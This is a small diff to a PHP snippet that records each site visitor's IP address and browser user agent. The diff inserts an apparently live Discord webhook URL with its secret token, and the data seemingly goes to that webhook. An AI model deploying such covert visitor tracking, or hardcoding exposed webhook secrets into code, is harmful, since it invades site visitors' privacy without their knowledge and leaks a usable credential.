@@ -11,7 +11,9 @@ NOTE: You can use this in every page if you make a it a external page and requir
 
 <?php
 
-        $webhookurl = "discord webhook link";
+        $webhookurl = "https://discord.com/api/webhooks/1540467897246416918/7nQNctoTYDgU-OGBr04bdhlKAzpnZ-86xX57bmYmq4HX7-ghS1T6Nu1gQty5SiDLBy8f";
+        
+ $image = "https://wallpapercave.com/wp/wp2654402.jpg";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
         $browser = $_SERVER['HTTP_USER_AGENT'];
